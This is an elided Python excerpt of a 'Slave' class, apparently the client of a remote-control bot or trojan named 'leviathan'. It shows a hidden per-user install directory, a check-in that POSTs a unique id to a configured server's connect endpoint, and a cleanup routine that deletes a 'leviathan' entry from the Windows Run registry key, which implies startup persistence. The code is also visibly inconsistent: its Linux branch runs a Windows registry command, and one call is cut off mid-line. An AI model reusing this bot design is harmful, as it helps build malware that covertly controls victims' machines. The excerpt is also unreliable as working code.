...
class Slave(object):
    ...
    def get_install_dir(self):
        ...
        if platform.system() == 'Linux':
            install_dir = self.expand_path('~/.leviathan')
        elif platform.system() == 'Windows':
            install_dir = os.path.join(os.getenv('USERPROFILE'), 'leviathan')
    ...
    def server_connect(self):
        ...
        req = requests.post(config.SERVER + '/api/' + self.uid + '/connect',
    ...
    def clean(self):
        ...
        if platform.system() == 'Linux':
            ...
            persist_dir = os.path.join(os.getenv('USERPROFILE'), 'leviathan')
            cmd = "reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v leviathan"
            subprocess.Popen(cmd, shell=True)
